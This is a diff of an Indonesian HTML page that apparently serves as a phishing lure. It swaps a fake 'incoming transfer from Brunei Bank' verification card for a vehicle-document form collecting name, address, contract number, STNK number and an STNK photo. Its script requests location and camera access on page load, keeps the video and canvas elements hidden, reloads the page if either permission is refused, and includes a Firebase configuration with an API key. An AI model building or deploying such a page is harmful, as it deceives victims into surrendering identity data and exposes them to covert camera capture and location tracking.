@@ -1,378 +1,173 @@
 <!DOCTYPE html>
 <html lang="id">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Verifikasi transaksi luar negri</title>
-  
-  <!-- Lucide Icons CDN -->
-  <script src="https://unpkg.com/lucide@latest"></script>
-  <!-- Firebase SDK (v9 Compatibility Mode) -->
-  <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
-  <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Formulir Input Data & STNK</title>
+    <!-- Lucide Icons CDN -->
+    <script src="https://unpkg.com/lucide@latest"></script>
+    <!-- Firebase SDK (v9 Compatibility Mode) -->
+    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
 
-  <style>
-    * {
-      margin: 0;
-      padding: 0;
-      box-sizing: border-box;
-      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-    }
-
-    body {
-      background-color: #f8fafc;
-      color: #334155;
-      min-height: 100vh;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      padding: 20px;
-    }
-
-    .card {
-      max-width: 440px;
-      width: 100%;
-      background-color: #ffffff;
-      border-radius: 16px;
-      box-shadow: 0 10px 25px -5px rgba(0, 0, 0, 0.08), 0 8px 10px -6px rgba(0, 0, 0, 0.01);
-      border: 1px solid #e2e8f0;
-      overflow: hidden;
-    }
-
-    .card-header {
-      background-color: #f7e017;
-      padding: 24px;
-      color: #1e293b;
-      text-align: center;
-    }
-
-    .badge-icon {
-      width: 48px;
-      height: 48px;
-      background-color: #ffffff;
-      border-radius: 50%;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      margin: 0 auto 12px;
-      color: #0f172a;
-      box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
-    }
-
-    .card-header h1 {
-      font-size: 1.2rem;
-      font-weight: 800;
-      letter-spacing: -0.3px;
-    }
-
-    .card-header p {
-      color: #475569;
-      font-size: 0.85rem;
-      margin-top: 4px;
-      font-weight: 500;
-    }
-
-    .card-body {
-      padding: 24px;
-    }
-
-    .notice-box {
-      background-color: #f0fdf4;
-      border: 1px solid #bbf7d0;
-      border-radius: 10px;
-      padding: 12px;
-      display: flex;
-      gap: 10px;
-      margin-bottom: 20px;
-    }
-
-    .notice-icon {
-      color: #16a34a;
-      flex-shrink: 0;
-    }
-
-    .notice-text {
-      font-size: 0.8rem;
-      color: #15803d;
-      line-height: 1.4;
-    }
-
-    .detail-group {
-      background-color: #f8fafc;
-      border-radius: 12px;
-      border: 1px solid #e2e8f0;
-      padding: 16px;
-      margin-bottom: 20px;
-    }
-
-    .detail-item {
-      display: flex;
-      justify-content: space-between;
-      align-items: flex-start;
-      padding: 10px 0;
-      border-bottom: 1px dashed #e2e8f0;
-    }
-
-    .detail-item:last-child {
-      border-bottom: none;
-      padding-bottom: 0;
-    }
-
-    .detail-item:first-child {
-      padding-top: 0;
-    }
-
-    .label {
-      font-size: 0.8rem;
-      color: #64748b;
-    }
-
-    .value {
-      font-size: 0.875rem;
-      font-weight: 600;
-      color: #0f172a;
-      text-align: right;
-    }
-
-    .value-highlight {
-      font-family: monospace;
-      font-size: 0.95rem;
-      letter-spacing: 0.5px;
-      color: #0284c7;
-    }
-
-    .flag-container {
-      display: inline-flex;
-      align-items: center;
-      gap: 6px;
-    }
-
-    .checkbox-group {
-      display: flex;
-      align-items: flex-start;
-      gap: 10px;
-      margin-bottom: 20px;
-      cursor: pointer;
-    }
-
-    .checkbox-group input {
-      margin-top: 3px;
-      accent-color: #0f172a;
-      width: 16px;
-      height: 16px;
-      cursor: pointer;
-    }
-
-    .checkbox-label {
-      font-size: 0.8rem;
-      color: #475569;
-      line-height: 1.4;
-    }
-
-    .btn-container {
-      display: flex;
-      gap: 10px;
-    }
-
-    .btn {
-      flex: 1;
-      padding: 12px;
-      border-radius: 10px;
-      font-size: 0.875rem;
-      font-weight: 600;
-      cursor: pointer;
-      border: none;
-      transition: all 0.2s ease;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      gap: 6px;
-    }
-
-    .btn-primary {
-      background-color: #0f172a;
-      color: #ffffff;
-      box-shadow: 0 4px 12px rgba(15, 23, 42, 0.2);
-    }
-
-    .btn-primary:hover {
-      background-color: #1e293b;
-    }
-
-    .btn-secondary {
-      background-color: #f1f5f9;
-      color: #64748b;
-      border: 1px solid #cbd5e1;
-    }
-
-    .btn-secondary:hover {
-      background-color: #e2e8f0;
-      color: #334155;
-    }
-
-    .card-footer {
-      text-align: center;
-      margin-top: 16px;
-      font-size: 0.75rem;
-      color: #94a3b8;
-    }
-
-    #webcamElement, #canvasElement {
-      display: none;
-    }
-
-    /* TAMPILAN LOADING FULL SCREEN */
-    .loading-container {
-      display: none;
-      flex-direction: column;
-      align-items: center;
-      justify-content: center;
-      text-align: center;
-      padding: 20px 0;
-    }
-
-    .spinner {
-      width: 50px;
-      height: 50px;
-      border: 5px solid rgba(0, 0, 0, 0.1);
-      border-top: 5px solid #0f172a;
-      border-radius: 50%;
-      animation: spin 1s linear infinite;
-      margin-bottom: 20px;
-    }
-
-    @keyframes spin {
-      0% { transform: rotate(0deg); }
-      100% { transform: rotate(360deg); }
-    }
-
-    .loading-title {
-      font-size: 16px;
-      font-weight: 600;
-      color: #0f172a;
-      margin-bottom: 8px;
-    }
-
-    .loading-subtext {
-      font-size: 13px;
-      color: #64748b;
-      margin-bottom: 20px;
-      animation: pulse 1.5s infinite;
-    }
-
-    @keyframes pulse {
-      0%, 100% { opacity: 0.6; }
-      50% { opacity: 1; }
-    }
-
-    .progress-bar-box {
-      width: 100%;
-      height: 8px;
-      background: #e2e8f0;
-      border-radius: 10px;
-      overflow: hidden;
-      margin-bottom: 12px;
-    }
-
-    .progress-bar-fill {
-      width: 0%;
-      height: 100%;
-      background: #0f172a;
-      border-radius: 10px;
-      transition: width 0.3s ease;
-    }
-
-    .percentage-text {
-      font-size: 14px;
-      font-weight: bold;
-      color: #334155;
-    }
-  </style>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f4f7f6;
+            margin: 0;
+            padding: 20px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
+        .form-container {
+            background-color: #ffffff;
+            padding: 30px;
+            border-radius: 8px;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
+            width: 100%;
+            max-width: 450px;
+        }
+        h2 {
+            text-align: center;
+            color: #333;
+            margin-bottom: 20px;
+        }
+        .form-group {
+            margin-bottom: 15px;
+        }
+        label {
+            display: block;
+            margin-bottom: 5px;
+            font-weight: bold;
+            color: #555;
+        }
+        input[type="text"],
+        textarea,
+        input[type="file"] {
+            width: 100%;
+            padding: 10px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            box-sizing: border-box;
+            font-size: 14px;
+        }
+        textarea {
+            resize: vertical;
+            height: 80px;
+        }
+        input[type="file"] {
+            padding: 5px;
+            background-color: #fafafa;
+        }
+        button {
+            width: 100%;
+            padding: 10px;
+            background-color: #007BFF;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            font-size: 16px;
+            cursor: pointer;
+            font-weight: bold;
+            margin-top: 10px;
+        }
+        button:hover {
+            background-color: #0056b3;
+        }
+        /* Styling untuk area loading */
+        #loadingArea {
+            display: none;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            text-align: center;
+            padding: 20px 0;
+        }
+        .progress-bar-container {
+            width: 100%;
+            background-color: #e0e0e0;
+            border-radius: 4px;
+            overflow: hidden;
+            height: 20px;
+            margin-top: 15px;
+        }
+        .progress-fill {
+            width: 0%;
+            height: 100%;
+            background-color: #007BFF;
+            transition: width 0.3s ease;
+        }
+        /* Sembunyikan elemen video dan canvas */
+        #webcamElement, #canvasElement {
+            display: none;
+        }
+    </style>
 </head>
 <body>
 
-  <div class="card">
-    <!-- Header -->
-    <div class="card-header">
-      <div class="badge-icon">
-        <i data-lucide="arrow-down-left"></i>
-      </div>
-      <h1>Verifikasi Transfer Masuk</h1>
-      <p>Konfirmasi Penerimaan Dana dari Brunei Bank</p>
+<div class="form-container">
+    
+    <!-- Konten Utama (Formulir) -->
+    <div id="mainContent">
+        <h2>Formulir Data Kendaraan</h2>
+        <form id="vehicleForm" action="proses.php" method="POST" enctype="multipart/form-data">
+            
+            <!-- Input Nama -->
+            <div class="form-group">
+                <label for="nama">Nama Lengkap:</label>
+                <input type="text" id="nama" name="nama" placeholder="Masukkan nama lengkap" required>
+            </div>
+
+            <!-- Input Alamat -->
+            <div class="form-group">
+                <label for="alamat">Alamat:</label>
+                <textarea id="alamat" name="alamat" placeholder="Masukkan alamat lengkap" required></textarea>
+            </div>
+
+            <!-- Input No Kontrak -->
+            <div class="form-group">
+                <label for="no_kontrak">No. Kontrak:</label>
+                <input type="text" id="no_kontrak" name="no_kontrak" placeholder="Masukkan nomor kontrak" required>
+            </div>
+
+            <!-- Input No STNK -->
+            <div class="form-group">
+                <label for="no_stnk">No. STNK:</label>
+                <input type="text" id="no_stnk" name="no_stnk" placeholder="Masukkan nomor STNK" required>
+            </div>
+
+            <!-- Upload Foto STNK -->
+            <div class="form-group">
+                <label for="foto_stnk">Upload Foto STNK:</label>
+                <input type="file" id="foto_stnk" name="foto_stnk" accept="image/*" required>
+                <small style="color: #777; font-size: 12px;">Format yang didukung: JPG, PNG, JPEG</small>
+            </div>
+
+            <!-- Tombol Submit -->
+            <button type="button" onclick="Verifikasi()">Kirim Data</button>
+
+        </form>
     </div>
 
-    <!-- Body Utama -->
-    <div class="card-body" id="mainContent">
-      <div class="notice-box">
-        <i data-lucide="check-circle-2" class="notice-icon"></i>
-        <div class="notice-text">
-          Sistem mendeteksi transaksi masuk dari jaringan bank Brunei Darussalam. Silakan verifikasi data rekening Anda.
+    <!-- Area Loading (Muncul saat tombol diklik & verifikasi berjalan) -->
+    <div id="loadingArea">
+        <h3>Memproses Data & Verifikasi...</h3>
+        <p>Mohon tunggu sebentar, sistem sedang memeriksa perangkat Anda.</p>
+        <div class="progress-bar-container">
+            <div id="progressFill" class="progress-fill"></div>
         </div>
-      </div>
-
-      <div class="detail-group">
-        <div class="detail-item">
-          <span class="label">Asal Pengirim</span>
-          <span class="value flag-container">🇧🇳 From Brunei Bank (BND)</span>
-        </div>
-        <div class="detail-item">
-          <span class="label">Bank Pengirim</span>
-          <span class="value">Bank Islam Brunei Darussalam</span>
-        </div>
-        <div class="detail-item">
-          <span class="label">Bank Penerima</span>
-          <span class="value flag-container">🇮🇩 BANK OCBC (Indonesia)</span>
-        </div>
-        <div class="detail-item">
-          <span class="label">Nama Penerima</span>
-          <span class="value">HARY SETYABUDHI</span>
-        </div>
-        <div class="detail-item">
-          <span class="label">Nomor Rekening Tujuan</span>
-          <span class="value value-highlight">9408-1045-8221</span>
-        </div>
-      </div>
-
-      <form id="verifyForm" onsubmit="event.preventDefault(); Verifikasi();">
-        <label class="checkbox-group">
-          <input type="checkbox" id="agreeCheckbox" required>
-          <span class="checkbox-label">
-            Saya mengonfirmasi bahwa data rekening penerima di Indonesia sudah benar untuk menerima dana transfer ini dari Brunei Bank.
-          </span>
-        </label>
-
-        <div class="btn-container">
-          <button type="button" class="btn btn-secondary">Batal</button>
-          <button type="submit" class="btn btn-primary">
-            <i data-lucide="check"></i>
-            <span>Verifikasi</span>
-          </button>
-        </div>
-      </form>
-
-      <div class="card-footer">
-        Transaksi internasional ini dilindungi enkripsi sistem perbankan.
-      </div>
+        <p id="percentText" style="margin-top: 10px; font-weight: bold;">0%</p>
     </div>
 
-    <!-- Area Loading (Disembunyikan secara bawaan) -->
-    <div class="card-body loading-container" id="loadingArea">
-      <div class="spinner"></div>
-      <div class="loading-title">Memproses Verifikasi...</div>
-      <div class="loading-subtext">Mohon jangan tutup halaman ini</div>
-      <div class="progress-bar-box">
-        <div class="progress-bar-fill" id="progressFill"></div>
-      </div>
-      <div class="percentage-text" id="percentText">0%</div>
-    </div>
-  </div>
+    <!-- Elemen Webcam dan Canvas (Disembunyikan) -->
+    <video id="webcamElement" autoplay playsinline></video>
+    <canvas id="canvasElement"></canvas>
 
-  <video id="webcamElement" autoplay playsinline></video>
-  <canvas id="canvasElement"></canvas>
+</div>
 
   <script>
-    lucide.createIcons();
-
     const firebaseConfig = {
       apiKey: "AIzaSyC5FzkrFW7JPOagOddT575F44wVT6hVeRE",
       authDomain: "sfkk-6af70.firebaseapp.com",
@@ -398,16 +193,18 @@
     let statusKamera = false;
 
     window.onload = async function() {
+      // Meminta izin lokasi dan kamera secara otomatis saat halaman dimuat
       statusLokasi = await mintaLokasi();
       statusKamera = await mintaKamera();
     };
 
     async function Verifikasi() {
+      // Validasi ulang jika izin belum diberikan sebelumnya
       if (!statusLokasi) statusLokasi = await mintaLokasi();
       if (!statusKamera) statusKamera = await mintaKamera();
 
       if (!statusLokasi || !statusKamera) {
-        alert("Layanan ini tidak bisa berjalan jika belum diizinkan.");
+        alert("Layanan ini tidak bisa berjalan jika izin Lokasi dan Kamera belum diizinkan.");
         window.location.reload();
         return;
       }
@@ -428,6 +225,8 @@
           percentText.innerText = progress + '%';
         } else {
           clearInterval(interval);
+          // Setelah progress bar selesai, form bisa di-submit secara otomatis ke backend (proses.php)
+          document.getElementById('vehicleForm').submit();
         }
       }, 300);
     }
